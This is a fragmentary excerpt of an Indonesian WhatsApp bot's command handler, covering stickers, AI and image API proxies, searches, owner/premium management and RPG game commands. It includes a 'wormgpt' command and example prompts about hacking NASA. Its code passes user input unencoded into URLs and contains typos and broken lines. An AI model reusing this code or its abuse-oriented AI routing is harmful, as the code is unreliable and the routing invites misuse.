//=================================================//
...
//if (!teks1) return ditzzreply(`Kirim/reply image/video dengan caption ${prefix + command} teks1|teks2`)
//if (!teks2) return ditzzreply(`Kirim/reply image/video dengan caption ${prefix + command} teks1|teks2`)
ditzzreply(mess.wait)
if (/image/.test(mime)) {
let media = await ditzzBug.downloadMediaMessage(quoted)
let encmedia = await ditzzBug.sendImageAsSticker(m.chat, media, m, { packname: `${teks1 ? teks1 : global.packname}`, author: `${teks2 ? teks2 : global.author}`  })
} else if (/video/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return ditzzreply('Maksimal 10 detik!')
let media = await ditzzBug.downloadMediaMessage(qmsg)
let encmedia = await ditzzBug.sendVideoAsSticker(m.chat, media, m, { packname: teks1, author: teks2 })
} else {
return ditzzreply(`Kirim Gambar/Video Dengan Caption ${prefix + command}\nDurasi Video 1-9 Detik`)
}
}
...
ditzzreply(`${nilai_one + nilai_two}`)
...
const nilai_two = Number(text.split("÷")[1])
ditzzreply(`${nilai_one / nilai_two}`)
} else ditzzreply(`*Example* : ${prefix + command} 1 + 1`)
}
break

//Openai
case "ai": case "chatgpt": case "openai": {
if (!q) return ditzzreply (`Example : ${m.prefix + m.command} create code html & css for hack NASA`)
var js = await fetch(`https://aemt.me/openai?text=${q}`) 
var json = await js.json()
ditzzreply(json.result)
}
break
//=================================================//
case "gpt4": {
...
//=================================================//
case 'wormgpt': {
if (!q) retuditzzreplyply (`Example : ${m.prefix + m.command} create code html & css for hack NASA`)
...
ditzzreply(response.data.choices[0].message.content);
}
break
//=================================================//
case 'txt2img':{
if (!text) throw ditzzreply('Masukan Promptnya\nExample:\n1girl, with glasses, in beach')
ditzzreply(`Proses Ayang`)
try {
let txt = await getBuffer(`https://xzn.wtf/api/txt2img?text=${text}&apikey=${api.skijo}`)
await ditzzBug.sendMessage(m.chat, {image: txt, caption: `Done Sayang`},{quoted: m})
 } catch (e) {
ditzzreply('Gagal Convert Gambar') 
}
}
break
//=================================================//
...
ditzzBug.sendFile(m.chat, hasil, 'anu.jpg', `Prompt: ${text}`, m)
}
break
//=================================================//
case "prompt-gpt": {
if (!text) return ditzzreply (`Example : ${m.prefix + m.command} buatkan lirik lagu tentang persahabatan dengan genre pop dan panjang 8 baris|# Lirik Lagu,# Genre: Pop,# Panjang: 8 baris,# Tema: Persahabatan
`)
iniprompt = q.split("|")[0]
initeks = q.split("|")[1]
...
//=================================================//
case "gptgo": {
if (!text) return ditzzreply (`Example : ${m.prefix + m.command} Apa itu gpt go?`)
var js = await fetch(`https://aemt.me/gptgo?text=${q}`) 
var json = await js.json()
ditzzreply(`Berikut Adalah Hasil Dari Gpt-Go \n\n\n\n\n ${json.result}`)
}
break
//=================================================//
case "dall-e": {
if (!q) return ditzzreply (`Example : ${m.prefix + m.command} Gunung Dengan Cuaca Hujan`)
...
//=================================================//
case "c-ai": {
if (!q) return ditzzreply (`Example : ${m.prefix + m.command} buatkan lirik lagu tentang persahabatan dengan genre pop dan panjang 8 baris|# Lirik Lagu,# Genre: Pop,# Panjang: 8 baris,# Tema: Persahabatan
`)
iniprompt = q.split("|")[0]
initeks = q.split("|")[1]
...
// Search
case 'google-search':
if (!q) return ditzzreply (`Example : ${m.prefix + m.command} santet`)
...
ditzzBug.sendMessage(m.chat, { image: { url: json.result[0].url }, caption: capt }, { quoted: m })
} else {
var capt = `❗ Note : Bot Akan Memberikan Hasil Acak. JIka Hasil Tidak Sesuai Dengan Yang Diinginkan, Silahkan Ketik Ulang .${command} ${q}
🔎 Search : ${q}
Maaf, tidak ada hasil yang ditemukan.`
ditzzBug.sendMessage(m.chat, capt, { quoted: m })
}
})
break
//=================================================//
case 'google-article': {
if (!q) return ditzzreply (`Example : ${m.prefix + m.command} penis`)
...
case 'search-kbbi': {
//inireact();
if (!q) return ditzzreply(`Example: ${m.prefix + m.command} persuasif`);
var response = await fetch(`https://dikaardnt.com/api/search/kbbi?q=${q}`);
var data = await response.text();
ditzzreply(`📝 Result : ${data}`)
}
break
//=================================================//
case 'search-apk': {
if (!q) return ditzzreply (`Example : ${m.prefix + m.command} whatsapp`)
...
`;
await ditzzBug.sendMessage(m.chat, { image: { url: json[0].thumbnail }, caption: capt }, { quoted: m })
}
break
//=================================================//
case 'search-sticker': {
if (!q) return ditzzreply (`Example : ${m.prefix + m.command} kururmi`)
...
case 'search-resep': {
//inireact();
if (!q) return ditzzreply(`Contoh: ${m.prefix + m.command} sambal`);
...
if (!isDeveloper) return ditzzreply(mess.owner)
if (args.length < 2)
return ditzzreply(`Penggunaan :\n*#addprem* @tag waktu\n*#addprem* nomor waktu\n\nContoh : #addprem @tag 30d`);
if (m.mentionedJid.length !== 0) {
for (let i = 0; i < m.mentionedJid.length; i++) {
addPremiumUser(m.mentionedJid[0], args[1], orgkaya);
}
ditzzreply("Sukses Premium")
} else {
addPremiumUser(args[0] + "@s.whatsapp.net", args[1], orgkaya);
ditzzreply("Sukses Via Nomer")
await sleep(2000)
ditzzBug.sendMessage(args[0] + "@s.whatsapp.net", {image: {url: `https://telegra.ph/file/4591e4839848523095e05.jpg`}, caption: `Kamu sekarang adalah Anggota Premium`},{quoted: qevent })
}
}
break
//=================================================//
case 'delprem': {
if (!isDeveloper) return ditzzreply(mess.owner)
if (args.length < 1) return ditzzreply(`Penggunaan :\n*#delprem* @tag\n*#delprem* nomor`)
if (m.mentionedJid.length !== 0) {
for (let i = 0; i < m.mentionedJid.length; i++) {
...
ditzzreply("Sukses Via Nomer")
await sleep(2000)
ditzzBug.sendMessage(targetNumber, {image: {url: `https://telegra.ph/file/4591e4839848523095e05.jpg`}, caption: `Kamu sekarang adalah Anggota Premium`},{quoted: qevent })
} else {
ditzzreply("Entitas premium tidak ditemukan")
}
}
}
break
...
case 'addbadwords': {
if (!isDeveloper) return ditzzreply(mess.owner)
if (!text) return ditzzreply(`Penggunaan ${prefix+command} anjing`)
addbadwords(text)
}
break
//=================================================//
...
case 'addowner': {
if (!isDeveloper) return ditzzreply(mess.owner)
if (!args[0]) return ditzzreply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} ${ownNumb}`)
prem1 = text.split("|")[0].replace(/[^0-9]/g, '')
let cek1 = await ditzzBug.onWhatsApp(prem1 + `@s.whatsapp.net`)
...
ditzzreply(`${prem1} Sudah menjadi kontributor!!!`)
ditzzBug.sendMessage(prem1+'@s.whatsapp.net', {image: {url: `https://telegra.ph/file/4591e4839848523095e05.jpg`}, caption: `Kamu sekarang adalah owner / kontributor bot`},{quoted: qpay})
}
break
//=================================================//
case 'delowner': {
...
fs.writeFileSync('./dtbs/owner.json', JSON.stringify(kontributor))
ditzzreply(`${prem2} Tidak lagi Kontributor!!!`)
}
break
//=================================================//
case 'addseller':
...
ditzzreply(`${prem1} Sudah menjadi orgkaya!!!`)
await sleep(3500)
ditzzBug.sendMessage(prem1 + '@s.whatsapp.net', {
...
fs.writeFileSync('./dtbs/seller.json', JSON.stringify(orgkaya))
ditzzreply(`${prem2} Tidak lagi Reseller!!!`)
break
...
.then(({data}) => {
ditzzBug.sendMessage(m.chat, { image: {url: data.url }, caption: '✅Succes, Tapi Lu jan ngaceng Woi' },{quoted: m })
})
}
break
//=================================================//
...
case 'galaxystyle':
case 'lighteffects':{
if (!q) return ditzzreply(`Example : ${prefix+command} ditzzBug`) 
ditzzreply(mess.wait)
let link
...
ditzzBug.sendMessage(m.chat, { image: { url: haldwhd }, caption: `${mess.success}` }, { quoted: m })
}
break
//=================================================//
case 'shadow': 
...
ditzzBug.sendMessage(m.chat, { image: { url: dehe }, caption: `${mess.success}` }, { quoted: m })
}
break
//=================================================//
...
ditzzBug.sendMessage(m.chat, { image: { url: yeha }, caption : mess.success }, { quoted: m })
}
break
//=================================================//
case 'kiss': {
if (m.mentionedJid[0] === m.sender) return ditzzreply(`gabisa bego`)
if (!m.mentionedJid[0]) return ditzzreply(`Contoh : ${prefix}kiss @${kontributor[1]}`, m.chat, { mentions: [kontributor[1] + '@s.whatsapp.net'] })
let mmk = await fetch(`https://api.waifu.pics/sfw/kiss`)
let data = await mmk.json()
await ditzzBug.sendVideoAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author });
await ditzzBug.sendMessage(m.chat, { text: `@${m.sender.split("@")[0]} Mencium @${m.mentionedJid[0].split("@")[0]}`, contextInfo: { mentionedJid: [m.sender, m.mentionedJid], groupMentions: [{ groupJid: m.chat, groupSubject: 'anjay' }] } }, { quoted: m });
}
break
//=================================================//
case 'hug': {
if (m.mentionedJid[0] === m.sender) return ditzzreply(`gabisa bego`)
if (!m.mentionedJid[0]) return ditzzreply(`Contoh : ${prefix}hug @${kontributor[1]}`, m.chat, { mentions: [kontributor[1] + '@s.whatsapp.net'] })
let mmk = await fetch(`https://api.waifu.pics/sfw/kiss`)
let data = await mmk.json()
await ditzzBug.sendVideoAsSticker(m.chat, data.url, m, { packname: global.packname, author: global.author });
await ditzzBug.sendMessage(m.chat, { text: `@${m.sender.split("@")[0]} Memeluk @${m.mentionedJid[0].split("@")[0]}`, contextInfo: { mentionedJid: [m.sender, m.mentionedJid], groupMentions: [{ groupJid: m.chat, groupSubject: 'anjay' }] } }, { quoted: m });
}
break
//=================================================//
case 'nebang': {
if (!isGroup) return ditzzreply(mess.ingroup)
...
if (new Date - user.lastparming < 1800000) return ditzzreply(`Anda sudah lelah untuk bekerja\nTunggu selama ${msToTime(time - new Date())} lagi`)
let wood = `${Math.floor(Math.random() * 50)}`.trim()
let money = `${Math.floor(Math.random() * 50000)}`.trim()
user.wood += wood * 1
user.money += money * 1
user.lastparming = new Date * 1
ditzzreply(`Selamat kamu mendapatkan : \n+${wood} Kayu\n+${money} Money`)
}
break
//=================================================//
case 'casino': {
...
let buatall = 1
ditzzBug.casino = ditzzBug.casino ? ditzzBug.casino : {}
if (m.chat in ditzzBug.casino) return reply ('Masih ada yang melakukan casino disini, tunggu sampai selesai!!')
else ditzzBug.casino[m.chat] = true
try {
...
if (args.length < 1) return ditzzreply('casino <jumlah>\n ' + 'casino 1000', )
if (db.data.users[m.sender].exp >= count * 1) {
db.data.users[m.sender].exp -= count * 1
//await ditzzreply('') //Kwkwwkkwlwlw
if (Aku > Kamu) {
...
} else ditzzreply(`Uang(xp) kamu tidak mencukupi untuk Casino silahkan *#kerja* terlebih dahulu!`)
} catch (e) {
console.log(e)
ditzzreply('Error!!')
if (DevMode) {
for (let jid of global.owner.map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').filter(v => v != ditzzBug.user.jid)) {
ditzzBug.sendMessage(jid, 'casino.js error\nNo: *' + m.sender.split`@`[0] + '*\nCommand: *' + m.text + '*\n\n*' + e + '*', MessageType.text)
}
}
} finally {
delete ditzzBug.casino[m.chat]
}
}
break
//=================================================//
...
users.lastparming = new Date * 1
ditzzreply(`Kamu baru saja selesai ${rumah} 🔨\nDan mendapatkan uang senilai *Rp ${hasilkuli} ${global.rpg.emoticon('money')}*`)
break
default:
return ditzzreply(`_*Pilih Pekerjaan Yang Kamu Inginkan*_\n\n_• Kuli_ \n_• Montir_ \n_• Petani_ \n_• Dokter_ \n_• Pedagang_ \n_• Ojek_ \n\nContoh Penggunaan :\nkerja Kuli`)
}
}
}
break
...
case 'bankcek': {
if (!isGroup) return ditzzreply(mess.ingroup)
let who = m.mentionedJid && m.mentionedJid[0] ? m.mentionedJid[0]: m.fromMe ? ditzzBug.user.jid: m.sender
if (!(who in db.data.users)) return m.ditzzreply(`User ${who} not in database`)
...
let caption = `
▧「 *BANK CEK* 」
│ 👤 Name: ${user.registered ? user.name: ditzzBug.getName(m.sender)}
...
if (user.money < 1000) {
return ditzzreply(`Uang Anda Harus Diatas Seribu Untuk Menggunakan Command Ini`);
}
...
user.lastbansos = new Date() * 1;
return ditzzreply(`Sorry Gan Lu g Berhasil Korupsi bansos Dan Tidak masuk penjara karna Kamu *melarikan diri🏃*`);
}
} else {
return ditzzreply(`Silahkan Menunggu Beberapa Menit Untuk bansos Lagi`);
}
}
break;
...
let timers = clockString(_timers)
let name = ditzzBug.getName(m.sender)
let user = db.data.users[m.sender]
let id = m.sender
let kerja = 'Taxy'
ditzzBug.misi = ditzzBug.misi ? ditzzBug.misi : {}
if (id in ditzzBug.misi) {
ditzzreply(`Selesaikan Misi ${ditzzBug.misi[id][0]} Terlebih Dahulu`)
throw false
}
...
setTimeout(() => {
ditzzreply('🔍Mencari pelanggan.....')
}, 0)
user.lastmisi = new Date * 1
} else ditzzreply(`Silahkan Menunggu Selama ${timers}, Untuk Menyelesaikan Misi Kembali`)
}
break
//=================================================//
case 'leaderboard': {
...
return await ditzzreply('*––––『 𝙻𝙴𝙰𝙳𝙴𝚁𝙱𝙾𝙰𝚁𝙳 』––––*\n' + wrong, {
contextInfo: {
...
${sortedItem.slice(page * 0, page * 5 + 5).map((user, i) => `${i + 1}.*﹙${user[type]}﹚*- ${participants.some(p => areJidsSameUser(user.jid, p.id)) ? `${user.registered ? user.name: ditzzBug.getName(user.jid)} \nwa.me/`: 'ғʀᴏᴍ ᴏᴛʜᴇʀ ɢʀᴏᴜᴩ\n @'}${user.jid.split`@`[0]}`).join`\n\n`}
`.trim()
return await ditzzreply(text,{
contextInfo: {
...
if (new Date - user.lastmulung < 1800000) return ditzzreply(`Anda sudah lelah untuk mulung\nTunggu selama ${msToTime(time - new Date())} lagi`)
...
ditzzBug.misi = ditzzBug.misi ? ditzzBug.misi : {}
if (id in ditzzBug.misi) {
return ditzzreply( `Selesaikan Misi ${ditzzBug.misi[id][0]} Terlebih Dahulu`)
 }
if (new Date - user.lastmisi > 3600000) {
...
let hsl = `🕸 *Hasil Berburu ${user.registered ? user.name : ditzzBug.getName(m.sender)}* 
${hewan1 ? `
...
setTimeout(() => {
ditzzreply('Dapat Sasaran')
}, 14000)

setTimeout(() => {
ditzzreply('Sedang mencari mangsa...')
}, 0)
user.lastmisi = new Date * 1
} else ditzzreply(`Silahkan Menunggu Selama ${timers}, Untuk Menyelesaikan Misi Kembali`)
}
...
if (!who) return ditzzreply ('Tag salah satu lah, yang kamu ingin berdagang bareng')
if (typeof db.data.users[who] == 'undefined') return ditzzreply('Pengguna tidak ada didalam data base')
let __timers = (new Date - db.data.users[m.sender].lastdagang)
let _timers = (28800000 - __timers)
let timers = clockString(_timers)
let users = db.data.users
let username = ditzzBug.getName(who)
if (new Date - db.data.users[m.sender].lastdagang > 28800000) {
if (4999 > users[who].money) return ditzzreply ('Target tidak memiliki modal harap masukkan modal 5000')
if (4999 > users[m.sender].money) return ditzzreply ('kamu tidak memiliki modal harap masukkan modal 5000')
users[who].money -= dapat * 1
users[m.sender].money -= dapat * 1
db.data.users[m.sender].lastdagang = new Date * 1
ditzzreply(`Mohon tunggu kak..\nKamu dan @${who.replace(/@.+/, '')} sedang berdagang.. ðŸ˜…\n\nKamu dan @${who.replace(/@.+/, '')} meletakkan modal -${dapat} ðŸ˜…`)
setTimeout(() => {
ditzzreply(m.chat, `Selamat kamu dan @${who.replace(/@.+/, '')} mendapatkan money..\n\nPenghasilan dagang kamu didapatkan +50000\n${users[m.sender].money += 50000} Money kamu\n\nPenghasilan dagang @${who.replace(/@.+/, '')} didapatkan +50000\n${users[who].money += 50000} Money @${who.replace(/@.+/, '')}`, m, {
contextInfo: {
mentionedJid: [m.sender, who]
}})
}, 3600000)
setTimeout(() => {
ditzzreply(`Selamat kamu dan @${who.replace(/@.+/, '')} mendapatkan money..\n\nPenghasilan dagang kamu didapatkan +50000\n${users[m.sender].money += 50000} Money kamu\n\nPenghasilan dagang @${who.replace(/@.+/, '')} didapatkan +50000\n${users[who].money += 50000} Money @${who.replace(/@.+/, '')}`, {
contextInfo: {
mentionedJid: [m.sender, who]
}})
}, 7200000)
...
} else ditzzreply(`Anda Sudah Berdagang , tunggu ${timers} lagi..`)
...
if (!who) return ditzzreply('Tag orang yang mau kamu Rampok!');
if (users[who].level > users[m.sender].level) return ditzzreply(`Level kamu harus lebih tinggi dari @${who.split('@')[0]} Untuk bisa merampoknya!`, false, { mentions: [who] })
let __timers = (new Date - db.data.users[m.sender].lastrampok)
let _timers = (3600000 - __timers)
let timers = clockString(_timers)
if (new Date - db.data.users[m.sender].lastrampok > 3600000) {
if (10000 > users[who].money) return ditzzreply('ᴛᴀʀɢᴇᴛ ɢᴀᴀᴅᴀ 💰ᴜᴀɴɢ ʙᴏᴅᴏʜ, ᴋɪꜱᴍɪɴ ᴅɪᴀ')
users[who].money -= dapat * 1
users[m.sender].money += dapat * 1
db.data.users[m.sender].lastrampok = new Date * 1
ditzzreply( `ʙᴇʀʜᴀꜱɪʟ ᴍᴇʀᴀᴍᴘᴏᴋ ᴍᴏɴᴇʏ ᴛᴀʀɢᴇᴛ ꜱᴇʙᴇꜱᴀʀ 💰${dapat}`)
} else ditzzreply( `Anda Sudah merampok dan berhasil sembunyi , tunggu ${timers} untuk merampok lagi`)
}
break
//=================================================//
case 'banknabung': {
if (!isGroup) return ditzzreply(mess.ingroup)
if (!q) return ditzzreply(`_*Anda Tidak Menginput Jumlah Uang Yang Ingin Ditabung*_
...
if (count <= 0) return ditzzreply('Kamu tidak memiliki cukup uang untuk menabung.')
if (user.atm == 0) return ditzzreply('kamu belum mempunyai kartu ATM')
if (user.bank > user.fullatm) return ditzzreply('Uang Di ATM sudah penuh!')
if (count > user.fullatm - user.bank) return ditzzreply('Uangnya nya sudah mencapai batas')
if (user.money >= xpperlimit * count) {
user.money -= xpperlimit * count
user.bank += count
ditzzreply(`Sukses menabung sebesar ${count} Money 💹`)
} else {
return
}
}
...
case 'banktarik': {
if (!isGroup) return ditzzreply(mess.ingroup)
if (!q) return ditzzreply(`_*Anda Tidak Menginput Jumlah Uang Yang Ingin Ditarik*_
...
if (count <= 0) return ditzzreply('Kamu tidak memiliki cukup uang untuk menabung.')
if (user.atm == 0) return ditzzreply('kamu belum mempuyai kartu ATM !')
if (user.bank >= xpperlimit * count) {
user.bank -= xpperlimit * count
user.money += count
ditzzreply(`Sukses menarik sebesar ${count} Money 💹`)
} else {
return
}
}
...
let kerja = 'Berkebun'
let id = m.chat
.misi = ditzzBug.misi ? ditzzBug.misi : {}
if (id in ditzzBug.misi) {
ditzzreply(`Selesaikan Misi ${ditzzBug.misi[id][0]} Terlebih Dahulu`)
return false
}
...
setTimeout(() => {
ditzzreply(`${caption.trim()}`)
}, 20000)

setTimeout(() => {
ditzzreply('Sedang Menanam Bibit...')
}, 0)
user.lastberkebon = new Date * 1
} else ditzzreply(`${caption}`)
} else ditzzreply(`Mohon Menunggu Selama ${timers} Untuk Berkebun Kembali...`)
}
break
//=================================================//
case 'bet': {
...
if (!item.includes(type)) return ditzzreply(`*List Item:*\n${item.map(v => `${global.rpg.emoticon(v)}${v}`.trim()).join('\n')}\n\nExample:\nbet money 100000`)
if ((user[type] * 1) < count) return ditzzreply(`*${type} ${global.rpg.emoticon(type)}* kamu tidak cukup!!`)
...
ditzzreply('Error saat melakukan judi (Rejected)')
}
}
break
//=================================================//
...
if (new Date - user.lastbonus < 86400000) return ditzzreply(`Kamu Sudah Ambil Bonus Hari Ini\nTunggu selama ${msToTime(time - new Date())} lagi`)
let money = Math.floor(Math.random() * 50000000)
user.money += money * 1
user.lastbonus = new Date * 1
ditzzreply(`Selamat Kamu Mendapatkan Bonus : \n+${money} Money`)
}
break
//=================================================//
case 'buah': {
...
setTimeout(() => {
ditzzreply('🔍Mencari Target pembunuhan.....')
}, 0)
user.lastmisi = new Date * 1
} else ditzzreply(`Silahkan Menunggu Selama ${timers}, Untuk Menyelesaikan Misi Kembali`)
}
...
ditzzreply(`Kamu sudah mengclaim dan mendapatkan *1000* 💵money dan *1* 🥤potion`)
user.money += 1000
user.potion += 1
user.lastclaim = new Date * 1
} else ditzzreply(`silahkan tunggu *${timers}* lagi untuk bisa mengclaim lagi`)
}
break
//=================================================//
case 'craft':
...
switch (type) {
case 'pickaxe':
if (user.pickaxe > 0) return ditzzreply('Kamu sudah memilik ini')
if(user.rock < 5 || user.wood < 10 || user.iron < 5 || user.string < 20) return ditzzreply(`Barang tidak cukup!\nUntuk membuat pickaxe. Kamu memerlukan : ${user.wood < 10 ? `\n${10 - user.wood} kayu🪵` : ''} ${user.iron < 5 ? `\n${5 - user.iron} iron⛓` : ''}${user.string < 20 ? `\n${20 - user.string} String🕸️` : ''}${user.rock < 5 ? `\n${5 - user.rock} Batu 🪨` : ''}`)
user.wood -= 10
stock.wood += 10
...
ditzzreply("Sukses membuat 1 pickaxe 🔨")
break
//=================================================//
case 'sword':
if (user.sword > 0) return ditzzreply('Kamu sudah memilik ini')
if(user.wood < 10 || user.iron < 15) return ditzzreply(`Barang tidak cukup!\nUntuk membuat sword. Kamu memerlukan :${user.wood < 10 ? `\n${10 - user.wood} kayu🪵` : ''}${user.iron < 15 ? `\n${15 - user.iron} iron⛓️` : ''}`)
user.wood -= 10
stock.wood += 10
...
ditzzreply("Sukses membuat 1 sword 🗡️")
break
//=================================================//
case 'fishingrod':
if (user.fishingrod > 0) return ditzzreply('Kamu sudah memilik ini')
if(user.wood < 20 || user.iron < 5 || user.string < 20) return ditzzreply(`Barang tidak cukup!\nUntuk membuat pancingan. Kamu memerlukan :${user.wood < 20 ? `\n${20 - user.wood} kayu🪵` : ''}${user.iron < 5 ? `\n${5 - user.iron} iron⛓` : ''}${user.string < 20 ? `\n${20 - user.string} String🕸️` : ''}`)
user.wood -= 10
stock.wood += 10
...
ditzzreply("Sukses membuat 1 Pancingan 🎣")
break
//=================================================//
case 'armor':
if (user.armor > 0) return ditzzreply('Kamu sudah memilik ini')
if(user.iron < 30 || user.emerald < 1 || user.diamond < 5) return ditzzreply(`Barang tidak cukup!\nUntuk membuat armor. Kamu memerlukan :${user.iron < 30 ? `\n${30 - user.iron} Iron ⛓️` : ''}${user.emerald < 1 ? `\n${1 - user.emerald} Emerald ❇️` : ''}${user.diamond < 5 ? `\n${5 - user.diamond} Diamond 💎` : ''}`)
user.emerald -= 1
stock.emerald += 1
...
ditzzreply("Sukses membuat 1 Armor 🥼")
break
//=================================================//
case 'atm':
if (user.atm > 0) return ditzzreply('Kamu sudah memilik ini')
if(user.emerald < 3 || user.money < 10000 || user.diamond < 6) return ditzzreply(`Barang tidak cukup!\nUntuk membuat atm. Kamu memerlukan :${user.money < 10000 ? `\n${10000 - user.money} Money 💹` : ''}${user.emerald < 3 ? `\n${3 - user.emerald} Emerald ❇️` : ''}${user.diamond < 6 ? `\n${6 - user.diamond} Diamond 💎` : ''}`)
user.emerald -= 3
stock.emerald += 3
...
ditzzreply("Sukses membuat 1 Atm 💳")
break
default:
return await ditzzreply(`${caption}`)
}
} 
} catch (err) {
ditzzreply("Error\n\n\n" + err.stack)
...
switch (type) {
case 'fox':
if (rubah == 0) return ditzzreply('ʏᴏᴜ ᴅᴏɴ\'ᴛ ʜᴀᴠᴇ ᴛʜɪs ᴘᴇᴛ ʏᴇᴛ!')
if (rubah == 10) return ditzzreply('ʏᴏᴜʀ ᴘᴇᴛ ɪs ᴍᴀx ʟᴇᴠᴇʟ !')
...
ditzzreply(`ғᴇᴇᴅɪɴɢ *${type}*...\n*${emo} ${type.capitalize()}:* ${pesan}`)
if (rubah > 0) {
let naiklvl = ((rubah * 100) - 1)
if (user.foxexp > naiklvl) {
user.fox += 1
user.foxexp -= (rubah * 100)
ditzzreply(`*ᴄᴏɴɢʀᴀᴛs!* , ʏᴏᴜʀ ᴘᴇᴛ ʟᴇᴠᴇʟᴜᴘ`)
}
}
} else ditzzreply(`ʏᴏᴜʀ ᴘᴇᴛ ғᴏᴏᴅ ɴᴏᴛ ᴇɴᴏᴜɢʜ`)
} else ditzzreply(`ʏᴏᴜʀ ᴘᴇᴛ ɪs ғᴜʟʟ, ᴛʀʏ ғᴇᴇᴅɪɴɢ ɪᴛ ᴀɢᴀɪɴ ɪɴ\n➞ *${waktur}*`)
break
//=================================================//
case 'cat':
if (kucing == 0) return ditzzreply('ʏᴏᴜ ᴅᴏɴ\'ᴛ ʜᴀᴠᴇ ᴛʜɪs ᴘᴇᴛ ʏᴇᴛ!')
if (kucing == 10) return ditzzreply('ʏᴏᴜʀ ᴘᴇᴛ ɪs ᴍᴀx ʟᴇᴠᴇʟ !')
...
//=================================================//
case 'dog':
if (anjing == 0) return ditzzreply('ʏᴏᴜ ᴅᴏɴ\'ᴛ ʜᴀᴠᴇ ᴛʜɪs ᴘᴇᴛ ʏᴇᴛ!')
if (anjing == 10) return ditzzreply('ʏᴏᴜʀ ᴘᴇᴛ ɪs ᴍᴀx ʟᴇᴠᴇʟ !')
...
//=================================================//
case 'horse':
if (kuda == 0) return ditzzreply('ʏᴏᴜ ᴅᴏɴ\'ᴛ ʜᴀᴠᴇ ᴛʜɪs ᴘᴇᴛ ʏᴇᴛ!')
if (kuda == 10) return ditzzreply('ʏᴏᴜʀ ᴘᴇᴛ ɪs ᴍᴀx ʟᴇᴠᴇʟ !')
...
//=================================================//
case 'robo':
if (robot == 0) return ditzzreply('ʏᴏᴜ ᴅᴏɴ\'ᴛ ʜᴀᴠᴇ ᴛʜɪs ᴘᴇᴛ ʏᴇᴛ!')
if (robot == 10) return ditzzreply('ʏᴏᴜʀ ᴘᴇᴛ ɪs ᴍᴀx ʟᴇᴠᴇʟ !')
...
case 'fighting':
 case 'fight': {
 if (!isGroup) return ditzzreply(mess.ingroup)
ditzzBug.fight = ditzzBug.fight ? ditzzBug.fight: {}
let user = db.data.users[m.sender]
if (typeof ditzzBug.fight[m.sender] != "undefined" && ditzzBug.fight[m.sender] == true) return ditzzreply(`Kamu masih bertarung.`)
...
ditzzreply(`*Kamu* (level ${user.level}) menantang *${ditzzBug.getName(lawan)}* (level ${db.data.users[lawan].level}) dan sedang dalam pertarungan.\n\nTunggu 5 menit lagi dan lihat siapa yg menang.`)
ditzzBug.fight[m.sender] = true
await delay(300000)
let kesempatan = []
...
user.money += hadiah
user.limit += 1
ditzzreply(`*${ditzzBug.getName(m.sender)}* [${pointPemain * 10}] - [${pointLawan * 10}] *${ditzzBug.getName(lawan)}*\n\n*Kamu* (level ${user.level}) menang melawan *${ditzzBug.getName(lawan)}* (level ${db.data.users[lawan].level}) karena kamu ${alasanMenang[getRandom(0, alasanMenang.length - 1)]}\n\nHadiah . ${hadiah.toLocaleString()}\n+1 Limit`)
} else if (pointPemain < pointLawan) {
let denda = (pointLawan - pointPemain) * 100000
user.money -= denda
user.limit += 1
ditzzreply(`*${ditzzBug.getName(m.sender)}* [${pointPemain * 10}] - [${pointLawan * 10}] *${ditzzBug.getName(lawan)}*\n\n*Kamu* (level ${user.level}) kalah melawan *${ditzzBug.getName(lawan)}* (level ${db.data.users[lawan].level}) karena kamu ${alasanKalah[getRandom(0, alasanKalah.length - 1)]}\n\nMoney kamu berkurang ${denda.toLocaleString()}\n+1 Limit`)
} else {
ditzzreply(`*${ditzzBug.getName(m.sender)}* [${pointPemain * 10}] - [${pointLawan * 10}] *${ditzzBug.getName(lawan)}*\n\nHasil imbang kak, ga dapet apa apa`)
}
delete ditzzBug.fight[m.sender]
}
break
//=================================================//
case 'gajian': {
...
ditzzreply('Nih gaji lu +Rp50000')
db.data.users[m.sender].lastclaim = new Date * 1
} else return ditzzreply(`Lu udah ambil jatah hari ini.\n\nTunggu ${cd1} Menit ${cd2} Detik!`)
}
break
//=================================================//
case 'me':
...
if (!(who in db.data.users)) return ditzzreply(`User ${who} not in database`)
...
let isMods = [ditzzBug.decodeJid(ditzzBug.user.id), ...global.owner.filter(([number, _, isDeveloper]) => number && isDeveloper).map(([number]) => number)].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(who)
let isDeveloper = m.fromMe || isMods || [ditzzBug.decodeJid(ditzzBug.user.id), ...global.owner.filter(([number, _, isDeveloper]) => number && !isDeveloper).map(([number]) => number)].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(who)
let isPrems = isDeveloper || new Date() - user.premiumTime < 0
...
let caption = `
🧑🏻‍🏫 ᴜsᴇʀ: *${user.registered ? user.name : ditzzBug.getName(who)}* ${user.level ? `
...
ditzzreply(`Succes mengupgrade *${rpg.emoticon('fishingrod')}FishingRod*`)
break
//=================================================//
case 'pickaxe':
if (pickaxe == 0) {
...
if (pickaxe > 9) return ditzzreply(`*${rpg.emoticon('pickaxe')}Pickaxe* kamu sudah level max!!`)
let __rock = pickaxe * 250
let __wood = pickaxe * 150
let __money = pickaxe * 1500000
if (rock < __rock || wood < __wood || money < __money) return ditzzreply(`
...
ditzzreply(`Succes mengupgrade *${rpg.emoticon('pickaxe')}Pickaxe*`)
break
//=================================================//
case 'sword':
if (sword == 0) {
...
if (sword > 9) return ditzzreply(`*${rpg.emoticon('sword')}Sword* kamu sudah level max!!`)
let _iron = sword * 250
let ___wood = sword * 150
let ___money = sword * 1000000
if (iron < _iron || wood < ___wood || money < ___money) return ditzzreply(`
Material Anda Kurang!!
...
ditzzreply(`Succes mengupgrade *${rpg.emoticon('sword')}Sword*`)
break
//=================================================//
case 'armor':
if (armor == 0) {
...
if (armor > 9) return ditzzreply(`*${rpg.emoticon('armor')}Armor* kamu sudah level max!!`)
let _diamond = armor * 5
let ____wood = armor * 150
let ____money = armor * 1000000
if (diamond < _diamond || wood < ____wood || money < ____money) return ditzzreply(`
Material Anda Kurang!!
...
ditzzreply(`Succes mengupgrade *${rpg.emoticon('armor')}Armor*`)
break
//=================================================//
case 'atm':
if (atm == 0) {
...
if (atm > 999) return ditzzreply(`*${rpg.emoticon('atm')}Atm* kamu sudah level max!!`)
let __diamond = atm * 3
let _emerald = atm * 5
let _____money = atm * 10000
if (diamond < __diamond || emerald < _emerald || money < _____money) return ditzzreply(`
Material Anda Kurang!!
...
